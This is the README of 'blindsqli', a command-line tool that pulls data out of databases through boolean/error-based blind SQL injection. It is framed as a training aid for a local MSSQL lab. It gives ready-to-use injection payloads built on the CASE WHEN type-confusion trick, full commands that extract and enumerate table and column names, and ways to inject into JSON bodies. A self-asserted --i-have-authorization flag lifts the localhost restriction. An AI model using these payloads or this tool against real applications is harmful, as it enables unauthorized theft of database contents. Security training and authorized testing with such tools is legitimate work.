# blindsqli

A modular command-line tool for **boolean / error-based blind SQL injection
data exfiltration**, built for a *local* intentionally-vulnerable training
application (e.g. `http://localhost:3000`).

The tool decides whether a SQL condition is true or false purely from the
**observable behaviour of the response** (an error vs. a normal page), using the
`CASE WHEN <condition> THEN 1 ELSE 'a' END` type-confusion technique. It never
uses the application's conventional/direct SQL injection path to read data — the
only data-retrieval channel is the boolean/error side channel.

> **Scope and safety.** This is a security *training* tool. It refuses to target
> non-local hosts unless you explicitly assert authorization (`--i-have-authorization`).
> Use it only against systems you own or are authorized to test. See
> [Safety and scope](#safety-and-scope).

> **New here?** Read [GETTING_STARTED.md](GETTING_STARTED.md) for a plain,
> copy-paste, step-by-step walkthrough.

> **Using Burp Suite?** The [`burp_sqli/`](burp_sqli/README.md) extension exports
> a selected Burp request straight into a `blindsqli` config file.

---

## Why Python?

The brief asked to evaluate languages against these needs: easy HTTP, efficient
concurrency, modularity, statistical/probabilistic processing, extensibility,
clear CLI, and robust error/timeout handling.

| Need | Python | Go | Rust |
|---|---|---|---|
| HTTP ergonomics | `requests`, stdlib | good (`net/http`) | good, more ceremony |
| Concurrency for **I/O-bound** work | thread pool releases the GIL during network waits | goroutines (excellent) | async, steeper |
| Statistical/probabilistic code | first-class (dicts, `math`, easy models) | verbose | verbose |
| Extensibility / rapid iteration | very high | medium | lower |
| CLI & config | `argparse`, JSON/YAML | good | good |
| Testing story | `pytest`, trivial fakes | good | good |

The workload is **I/O-bound** (each oracle question is one HTTP round-trip), so
Python's threaded worker pool gives real concurrency: the GIL is released while
sockets wait. Combined with Python's strength for the probabilistic prediction
models and its low-friction modularity and testing, Python is the best fit here.
Go would be the runner-up if raw throughput dominated; it does not, because the
target's latency, not the client's CPU, is the bottleneck.

---

## Install

```bash
cd sqli-blind-exfil
python -m venv .venv && source .venv/bin/activate
pip install -r requirements.txt        # runtime (requests, optional PyYAML)
# for tests:
pip install -r requirements-dev.txt
```

Python 3.9+ is required. The package is importable as `blindsqli` and exposes a
CLI (`python -m blindsqli ...`, or `blindsqli` if installed with `pip install -e .`).

---

## Quick start against the bundled mock target

You do not need the real lab to try the tool. A faithful local mock reproduces
the CASE true/false behaviour.

Terminal 1 — start the mock on port 3000:

```bash
python mock_target.py --port 3000 --secret jun_users
```

Terminal 2 — first, inspect how true and false responses differ:

```bash
python -m blindsqli calibrate --url http://localhost:3000/ --param q
```

```json
{
  "ok":   {"status": 200, "length": 155, "elapsed": 0.001},
  "error":{"status": 500, "length": 165, "elapsed": 0.001},
  "distinguishable_by": ["status", "length", "body"]
}
```

Then extract the first table name:

```bash
python -m blindsqli extract \
  --url http://localhost:3000/ --param q \
  --preset first-table --workers 10 -v
```

You will see live progress and, at the end, the recovered value written to
`exfil_result.json`:

```json
{ "target": "TABLE_NAME[0]", "value": "jun_users", "complete": true, "length": 9, ... }
```

---

## Running against the bundled lab (localhost:3000)

Verified against the local "Blind SQLi Lab" (an MSSQL back end) whose vulnerable
endpoint is `GET /search?q=`. Two lab-specific details, both discovered by
probing first (as the brief requires):

- The error side channel is a **type-conversion / runtime error**: a valid query
  returns HTTP 200; a false CASE branch raises a SQL error and returns HTTP 500.
- The predicate is only evaluated when the injected row exists, so the payload
  prefix uses a **real username** (`juniper'`), not `a'`.
- MSSQL's default collation is case-insensitive; the `mssql` dialect forces
  `COLLATE Latin1_General_BIN` on character comparisons so case and ordering are
  exact.

```bash
python -m blindsqli extract \
  --url http://localhost:3000/search --param q \
  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
  --dialect mssql --preset first-table --workers 10 -v
```

Result (auto-calibrated TRUE=200 / FALSE=500, extracted through the error
channel only):

```json
{ "target": "TABLE_NAME[0]", "value": "jun_notes", "complete": true, "length": 9,
  "requests_completed": 92, "requests_failed": 0 }
```

Enumerating all three tables with a shared engine shows the adaptive model
learning the recurring `jun_` prefix — each successive name costs fewer
requests: `jun_notes` (89), `jun_roles` (66), `jun_users` (61).

## Boolean TRUE / FALSE detection examples

The oracle maps an observable **non-error** response to `TRUE` and an
**error** response to `FALSE`:

```text
condition                       payload sent                                             oracle
------------------------------  -------------------------------------------------------  ------
(TABLE_NAME) LIKE 'jun%'        a' AND 1=(SELECT CASE WHEN (... LIKE 'jun%' ...) ...)--   TRUE   (200, normal page)
(TABLE_NAME) LIKE 'xyz%'        a' AND 1=(SELECT CASE WHEN (... LIKE 'xyz%' ...) ...)--   FALSE  (500, "Conversion failed ...")
```

Programmatically:

```python
from blindsqli.config import Config
from blindsqli.oracle import BooleanOracle
from blindsqli.dialect import get_dialect
from blindsqli.targets import first_table_name

cfg = Config(target_url="http://localhost:3000/", injection_param="q")
oracle = BooleanOracle(cfg); oracle.calibrate()
t = first_table_name(get_dialect("mssql"))
print(oracle.test(t.starts_with("jun")))  # OracleResult.TRUE
print(oracle.test(t.starts_with("xyz")))  # OracleResult.FALSE
```

---

## Extracting the first table name (real lab)

```bash
python -m blindsqli extract \
  --url http://localhost:3000/ \
  --param q \
  --base-payload "a' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)--" \
  --dialect mssql \
  --preset first-table \
  --workers 10 \
  --output first_table.json \
  -v
```

If auto-calibration cannot find a side channel it will tell you, so you can
inspect the app and tune `--base-payload`, `--param`, or the classifier config.

## Extracting ALL table names

`extract --preset first-table` recovers only the first table. To get **every**
table name, use the `enumerate` command: it discovers the row count and then
extracts each name, reusing one engine so the character/sequence predictors keep
learning across names (later `jun_` names cost fewer requests).

```bash
python -m blindsqli enumerate \
  --url http://localhost:3000/search --method POST \
  --body-mode json --param "[0].value" --json-template '[{"value":"juniper"}]' \
  --base-payload "juniper' AND 1=(SELECT CASE WHEN ({condition}) THEN 1 ELSE 'a' END)-- " \
  --dialect mssql --output all_tables.json -v
```

Output is a JSON list:

```json
{ "what": "tables", "count": 3,
  "values": ["jun_notes", "jun_roles", "jun_users"] }
```

Enumerate a table's columns with `--what columns --table jun_users`, and cap the
number of rows with `--limit N`.

---

## Configuration

Everything environment-specific is configurable via flags or a JSON/YAML file
(`--config config.example.yaml`). Precedence: **defaults < config file < flags**.

Key options (see `config.example.yaml` for the full set):

| Option | Meaning |
|---|---|
| `target_url`, `injection_param`, `http_method` | where and how to inject |
| `proxy`, `proxy_insecure` | route requests through an intercepting proxy; optionally skip TLS verification |
| `body_mode` | `auto` (query for GET, form for POST), `form`, `json`, or `raw` |
| `json_template`, `body_template`, `content_type` | JSON base body / raw body template / content-type override |
| `base_payload` | payload template containing `{condition}` |
| `request_timeout`, `max_retries`, `retry_backoff`, `ambiguous_retries` | reliability |
| `workers` | bounded worker-pool size |
| `charset`, `max_length` | search space |
| `strategy` | `adaptive` (default), `linear`, or `binary` |
| `target_expression`, `dialect` | what SQL scalar to exfiltrate, and its dialect |
| `classifier.*` | error-detection rules (status/body/length/headers/timing) |
| `verbosity`, `output_file` | logging and machine-readable output |

The **classifier** can detect the error condition from any combination of HTTP
status, body signatures/regexes, body length, headers and response timing. When
you supply no explicit rules, the oracle **auto-calibrates** by sending a known
`1=1` and `1=2` and learning the fingerprint — this is how the tool "inspects
the target" before extracting, instead of assuming an HTTP error format.

---

### Routing through a proxy

To watch the tool's traffic in an intercepting proxy such as Burp or ZAP:

```bash
python -m blindsqli extract --url http://localhost:3000/search --param q \
  --preset first-table --proxy http://127.0.0.1:8080
# add --proxy-insecure if the proxy presents a self-signed TLS certificate
```

The explicit `--proxy` takes precedence over `HTTP_PROXY`/`HTTPS_PROXY` and is
**not** bypassed for loopback targets (unlike the environment variables), so a
local lab is captured as expected. The scope guard still applies to the target
URL, not the proxy.

### Injecting into a JSON body

When the vulnerable parameter lives in a JSON request body, only the transport
changes; detection, calibration and the adaptive search are identical. Use
`--body-mode json` and give `--param` as a dotted key path:

```bash
python -m blindsqli extract --url http://host/api/search --method POST \
  --body-mode json --param creds.username \
  --json-template '{"page":1}' --preset first-table
```

That sends `{"page":1,"creds":{"username":"<payload>"}}`. The value is placed
via a real JSON encoder, so SQL quotes and backslashes are escaped correctly.

The path supports **array indices** too, so a body that is a top-level array
like `[{"code":"X","vulnerableParam":"1"}]` is reached with
`--param '[0].vulnerableParam'` (segments: `data.items[2].name` also works).

For non-standard bodies (nested arrays, GraphQL, XML) use a raw template with a
placeholder — `{value_json}` is JSON-string-escaped, `{value}` is verbatim:

```bash
python -m blindsqli extract --url http://host/api --method POST \
  --body-mode raw --body-template '{"q":"{value_json}"}' \
  --content-type application/json --preset first-table
```

## Reliability model

Every oracle question resolves to one of:

```text
TRUE            observable non-error response
FALSE           observable error response
REQUEST_ERROR   connection/transport failure (after retries)
TIMEOUT         no response in time (after retries)
UNKNOWN         classifier could not decide (after retries)
```

A network failure is **never** silently treated as `FALSE`. Ambiguous results
are retried; if a character still cannot be resolved, extraction stops and the
result is reported as partial with `undetermined_at` set. Run with `-vvv` for
per-request diagnostics explaining each classification.

---

## Architecture (short)

```text
Target/Query Definitions  ->  Boolean SQL condition
        ->  Payload Builder  ->  HTTP Client  ->  Response/Error Classifier
        ->  Boolean Oracle (TRUE/FALSE/…)  ->  Exfiltration Engine
                 ^                                   |
   Character Predictor + Sequence Predictor  <-------+  (learn & rank)
```

Each box is an independent module with a narrow interface, so, for example, the
classifier can be swapped without touching the prediction engine. Full details
in [ARCHITECTURE.md](ARCHITECTURE.md). To add new things to extract (database
name, columns, field values), see [ADDING_TARGETS.md](ADDING_TARGETS.md).

---

## Testing

```bash
pytest                      # unit tests (no network needed for most)
pytest tests/test_integration.py   # full stack over HTTP against the mock
```

Unit tests cover payload generation, condition construction, classification,
retry behaviour, concurrency (ordering + bounded pool), character prediction,
sequence/pattern prediction, cost-based strategy selection, and termination.
The integration test spins up the local mock and extracts a table name end to
end. Tests that need `requests` are skipped automatically if it is absent.

---

## Troubleshooting

**"binary search converged on 'z' … verification failed"** (or any character
that comes out wrong). In error-based blind SQLi an *invalid* SQL condition
returns the error page too, so a malformed comparison is read as FALSE and the
search drifts to the end of the charset. The tool now falls back to an
order-independent equality scan automatically, but if that also fails the
condition is genuinely not valid for the target. Usual causes and fixes:

- **Wrong dialect.** The default is MSSQL. If the backend is MySQL/Postgres,
  pass `--dialect mysql` / `--dialect postgres`.
- **Unsupported collation.** MSSQL comparisons are forced to
  `COLLATE Latin1_General_BIN` for exact case/order. If that collation name is
  not valid on the target, pass `--no-collation` (or `--collation <name>`).
- **Character outside the charset.** Widen `--charset`.

**Both true and false return the same status; only Content-Length differs, but
the search skips the right character.** If the page **echoes the submitted
payload**, a longer extraction payload inflates the body and skews a raw length
comparison, so a true response is misread as false. The classifier strips the
sent payload (raw, URL-encoded and HTML-escaped forms) from the body before
measuring length and markers, so only the genuine true/false difference counts.
If your target reflects the payload in some other encoding, pin an explicit
`error_body_signatures` in the config instead.

## Safety and scope

- Targets are checked against a loopback allowlist. Non-local hosts are refused
  unless you pass `--i-have-authorization`, which is an explicit assertion that
  you are authorized to test that host.
- The tool implements **only** the boolean/error side channel. It does not use
  the app's conventional SQLi path to read data directly, and it has no feature
  for discovering or scanning arbitrary external hosts.
- Intended use: learning and authorized testing against a local vulnerable lab.
